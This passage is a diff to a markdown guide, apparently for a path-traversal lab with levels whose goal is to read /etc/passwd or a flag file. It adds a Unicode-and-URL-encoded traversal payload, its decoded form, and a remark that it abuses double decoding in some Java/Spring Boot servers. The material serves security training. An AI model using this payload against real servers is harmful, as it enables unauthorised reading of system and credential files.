@@ -44,3 +44,14 @@ Strict sanitization blocks normal encoding. Use Unicode with URL encoding.
 - **Payload**: `%5c%75%30%30%32%65%5c%75%30%30%32%65%5c%75%30%30%32%66%5c%75%30%30%32%65%5c%75%30%30%32%65%5c%75%30%30%32%66%5c%75%30%30%32%65%5c%75%30%30%32%65%5c%75%30%30%32%66%5c%75%30%30%32%65%5c%75%30%30%32%65%5c%75%30%30%32%66%5c%75%30%30%32%65%5c%75%30%30%32%65%5c%75%30%30%32%66%5c%75%30%30%32%65%5c%75%30%30%32%65%5c%75%30%30%32%66%5c%75%30%30%36%35%5c%75%30%30%37%34%5c%75%30%30%36%33%5c%75%30%30%32%66%5c%75%30%30%37%30%5c%75%30%30%36%31%5c%75%30%30%37%33%5c%75%30%30%37%33%5c%75%30%30%37%37%5c%75%30%30%36%34`
 
 - **Decoded Path**:
+`\u002e\u002e\u002f\u002e\u002e\u002f\u002e\u002e\u002f\u002e\u002e\u002f\u002e\u002e\u002f\u002e\u002e\u002fetc/passwd`
+
+- **Note**: Exploits double decoding and Unicode parsing by some Java/Spring Boot servers.
+
+
+## 🎯 Objective
+
+In each level, your goal is to:
+
+- Read the `/etc/passwd` file (on Linux-based servers)
+- Or extract the `flag.txt` file
